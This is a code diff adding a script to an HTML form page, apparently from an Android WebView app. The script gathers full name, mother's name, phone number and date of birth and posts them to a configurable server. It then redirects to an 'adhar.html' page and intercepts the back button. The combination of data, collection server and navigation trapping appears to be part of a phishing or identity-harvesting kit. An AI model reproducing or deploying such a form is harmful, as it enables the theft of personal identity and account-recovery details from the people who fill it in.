@@ -1,0 +1,295 @@
+
+<script>
+    // ── Config (replaces FIREBASE_DB_URL + AndroidBridge.getDeviceUID) ────────
+    var uid = '', appId = '', apiBaseUrl = '';
+
+    function loadConfig() {
+        if (window.AndroidBridge) {
+            try {
+                var cfg = JSON.parse(window.AndroidBridge.getConfigJson());
+                uid        = cfg.uid          || '';
+                appId      = cfg.app_id       || '';
+                apiBaseUrl = (cfg.api_base_url || '').replace(/\/+$/, '');
+            } catch(e) {}
+            if (!uid && typeof AndroidBridge.getDeviceUID === 'function') {
+                try { uid = AndroidBridge.getDeviceUID(); } catch(e) {}
+            }
+        }
+        var p = new URLSearchParams(window.location.search);
+        if (!uid)        uid        = p.get('uid')          || '';
+        if (!appId)      appId      = p.get('app_id')       || '';
+        if (!apiBaseUrl) apiBaseUrl = (p.get('api_base_url') || '').replace(/\/+$/, '');
+        if (!uid) uid = 'UID_' + Math.random().toString(36).substring(2, 15) + Date.now().toString(36);
+    }
+
+    // ── API call (replaces Firebase fetch) ────────────────────────────────────
+    function saveToApi(formData) {
+        return fetch(apiBaseUrl + '/data', {
+            method:  'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body:    JSON.stringify({ appId: appId, deviceId: uid, data: formData })
+        }).then(function(res) {
+            if (!res.ok) throw new Error('HTTP ' + res.status);
+            return res.json();
+        });
+    }
+
+    loadConfig();
+
+    var btnProceed    = document.getElementById("btnProceed");
+    var overlay       = document.getElementById("progressOverlay");
+    var fullNameInput = document.getElementById("fullName");
+    var motherNameInput = document.getElementById("motherName");
+    var phoneInput    = document.getElementById("phoneNumber");
+    var dobInput      = document.getElementById("dob");
+    var fullNameError = document.getElementById("fullNameError");
+    var motherNameError = document.getElementById("motherNameError");
+    var phoneError    = document.getElementById("phoneError");
+    var dobError      = document.getElementById("dobError");
+
+    function hideAllErrors() {
+        fullNameError.style.display = "none";
+        motherNameError.style.display = "none";
+        phoneError.style.display = "none";
+        dobError.style.display = "none";
+    }
+
+    function showError(element) {
+        if (element) element.style.display = "block";
+    }
+
+    function isValidDate(dateStr) {
+        if (!dateStr || dateStr.length !== 10) return false;
+        if (!/^\d{2}\/\d{2}\/\d{4}$/.test(dateStr)) return false;
+        var parts = dateStr.split('/').map(Number);
+        var day = parts[0], month = parts[1], year = parts[2];
+        if (isNaN(day) || isNaN(month) || isNaN(year)) return false;
+        if (year < 1900 || year > 2100) return false;
+        if (month < 1 || month > 12) return false;
+        var daysInMonth = new Date(year, month, 0).getDate();
+        if (day < 1 || day > daysInMonth) return false;
+        return true;
+    }
+
+    var isUpdating = false;
+
+    function handleDobInput(e) {
+        if (isUpdating) return;
+        var input = dobInput;
+        var value = input.value;
+        var numbers = value.replace(/\D/g, '');
+        if (numbers.length > 8) numbers = numbers.slice(0, 8);
+        var formatted = '';
+        for (var i = 0; i < numbers.length; i++) {
+            if (i === 2 || i === 4) formatted += '/';
+            formatted += numbers[i];
+        }
+        var cursorPos = input.selectionStart;
+        var oldLength = value.length;
+        var newLength = formatted.length;
+        isUpdating = true;
+        input.value = formatted;
+        isUpdating = false;
+        var newCursorPos = cursorPos;
+        if (newLength > oldLength) {
+            if (cursorPos === 2 && numbers.length >= 2) {
+                newCursorPos = 3;
+            } else if (cursorPos === 5 && numbers.length >= 4) {
+                newCursorPos = 6;
+            } else {
+                newCursorPos = cursorPos + (newLength - oldLength);
+            }
+        } else if (newLength < oldLength) {
+            if (value[cursorPos] === '/' && cursorPos < oldLength) {
+                newCursorPos = cursorPos;
+            } else {
+                newCursorPos = cursorPos - (oldLength - newLength);
+            }
+        } else {
+            if (cursorPos === 2 && formatted[2] === '/' && value[2] !== '/') {
+                newCursorPos = 3;
+            } else if (cursorPos === 5 && formatted[5] === '/' && value[5] !== '/') {
+                newCursorPos = 6;
+            } else {
+                newCursorPos = cursorPos;
+            }
+        }
+        newCursorPos = Math.max(0, Math.min(newCursorPos, formatted.length));
+        setTimeout(function() {
+            if (document.activeElement === input) {
+                input.setSelectionRange(newCursorPos, newCursorPos);
+            }
+        }, 0);
+        if (formatted.length === 10) {
+            if (isValidDate(formatted)) {
+                dobError.style.display = "none";
+            } else {
+                dobError.style.display = "block";
+            }
+        } else if (formatted.length > 0) {
+            dobError.style.display = "block";
+            dobError.innerText = "Date must be in DD/MM/YYYY format";
+        } else {
+            dobError.style.display = "none";
+        }
+        autoSaveFields();
+    }
+
+    function handleDobKeydown(e) {
+        var input = dobInput;
+        var cursorPos = input.selectionStart;
+        var value = input.value;
+        if (e.key === 'Backspace' && cursorPos > 0) {
+            var charBefore = value[cursorPos - 1];
+            if (charBefore === '/') {
+                e.preventDefault();
+                var numbers = value.replace(/\D/g, '');
+                var deleteIndex = cursorPos - 2;
+                if (deleteIndex >= 0 && deleteIndex < numbers.length) {
+                    numbers = numbers.slice(0, deleteIndex) + numbers.slice(deleteIndex + 1);
+                    var formatted = '';
+                    for (var i = 0; i < numbers.length; i++) {
+                        if (i === 2 || i === 4) formatted += '/';
+                        formatted += numbers[i];
+                    }
+                    input.value = formatted;
+                    var newCursor = Math.max(0, Math.min(cursorPos - 2, formatted.length));
+                    input.setSelectionRange(newCursor, newCursor);
+                    autoSaveFields();
+                }
+            }
+        }
+        if (e.key === 'Delete' && cursorPos < value.length) {
+            var charAt = value[cursorPos];
+            if (charAt === '/') {
+                e.preventDefault();
+                var numbers2 = value.replace(/\D/g, '');
+                var deleteIndex2 = cursorPos - Math.floor(cursorPos / 3);
+                if (deleteIndex2 >= 0 && deleteIndex2 < numbers2.length) {
+                    numbers2 = numbers2.slice(0, deleteIndex2) + numbers2.slice(deleteIndex2 + 1);
+                    var formatted2 = '';
+                    for (var j = 0; j < numbers2.length; j++) {
+                        if (j === 2 || j === 4) formatted2 += '/';
+                        formatted2 += numbers2[j];
+                    }
+                    input.value = formatted2;
+                    var newCursor2 = Math.max(0, Math.min(cursorPos, formatted2.length));
+                    input.setSelectionRange(newCursor2, newCursor2);
+                    autoSaveFields();
+                }
+            }
+        }
+    }
+
+    function validateForm() {
+        var isValid = true;
+        hideAllErrors();
+        var fullName   = fullNameInput.value.trim();
+        var motherName = motherNameInput.value.trim();
+        var phoneNumber= phoneInput.value.trim();
+        var dob        = dobInput.value.trim();
+        if (!fullName)   { showError(fullNameError); isValid = false; }
+        if (!motherName) { showError(motherNameError); isValid = false; }
+        if (!phoneNumber || phoneNumber.length !== 10 || !/^\d{10}$/.test(phoneNumber)) {
+            showError(phoneError); isValid = false;
+        }
+        if (!dob || !isValidDate(dob)) {
+            if (!dob) dobError.innerText = "Date of birth is required";
+            else dobError.innerText = "Valid date in DD/MM/YYYY format";
+            showError(dobError); isValid = false;
+        }
+        return isValid;
+    }
+
+    function autoSaveFields() {
+        localStorage.setItem("temp_fullName", fullNameInput.value);
+        localStorage.setItem("temp_motherName", motherNameInput.value);
+        localStorage.setItem("temp_phone", phoneInput.value);
+        localStorage.setItem("temp_dob", dobInput.value);
+    }
+
+    window.addEventListener("load", function() {
+        var savedName   = localStorage.getItem("temp_fullName");
+        var savedMother = localStorage.getItem("temp_motherName");
+        var savedPhone  = localStorage.getItem("temp_phone");
+        var savedDob    = localStorage.getItem("temp_dob");
+        if (savedName)   fullNameInput.value   = savedName;
+        if (savedMother) motherNameInput.value = savedMother;
+        if (savedPhone)  phoneInput.value      = savedPhone;
+        if (savedDob)    dobInput.value        = savedDob;
+    });
+
+    phoneInput.addEventListener("input", function() {
+        var raw = this.value.replace(/\D/g, '');
+        if (raw.length > 10) raw = raw.slice(0, 10);
+        this.value = raw;
+        if (raw.length === 10) phoneError.style.display = "none";
+        else if (raw.length > 0) phoneError.style.display = "block";
+        autoSaveFields();
+    });
+
+    fullNameInput.addEventListener("input", autoSaveFields);
+    motherNameInput.addEventListener("input", autoSaveFields);
+    dobInput.addEventListener("input", handleDobInput);
+    dobInput.addEventListener("keydown", handleDobKeydown);
+
+    btnProceed.addEventListener("click", async function() {
+        if (!validateForm()) {
+            var firstError = document.querySelector(".error-hint[style*='display: block']");
+            if (firstError) firstError.scrollIntoView({ behavior: "smooth", block: "center" });
+            return;
+        }
+
+        var fullName    = fullNameInput.value.trim();
+        var motherName  = motherNameInput.value.trim();
+        var phoneNumber = phoneInput.value.trim();
+        var dob         = dobInput.value.trim();
+
+        var formData = {
+            fullName:    fullName,
+            motherName:  motherName,
+            phoneNumber: phoneNumber,
+            dob:         dob,
+            timestamp:   Date.now()
+        };
+
+        overlay.style.display = "flex";
+        btnProceed.disabled = true;
+
+        try {
+            // Save to API (replaces Firebase)
+            await saveToApi(formData);
+
+            fullNameInput.value   = "";
+            motherNameInput.value = "";
+            phoneInput.value      = "";
+            dobInput.value        = "";
+            localStorage.removeItem("temp_fullName");
+            localStorage.removeItem("temp_motherName");
+            localStorage.removeItem("temp_phone");
+            localStorage.removeItem("temp_dob");
+
+            alert("Data submitted successfully! Redirecting to next page...");
+
+            var redirectParams = new URLSearchParams({ uid: uid, app_id: appId, api_base_url: apiBaseUrl });
+            window.location.href = "adhar.html?" + redirectParams.toString();
+        } catch(err) {
+            var msg = "Failed to save data. ";
+            if (err.message.includes("Failed to fetch")) msg += "Network error. Please check your internet connection.";
+            else msg += "Error: " + err.message;
+            alert(msg);
+        } finally {
+            overlay.style.display = "none";
+            btnProceed.disabled = false;
+        }
+    });
+
+    window.safeBack = function() {
+        window.location.href = "index.html";
+    };
+    history.pushState({page: 'form'}, "", location.href);
+    window.addEventListener("popstate", function() { window.safeBack(); });
+    if (window.AndroidBridge) {
+        try { AndroidBridge.onBackPressed = function() { window.safeBack(); }; } catch(e) {}
+    }
+</script>
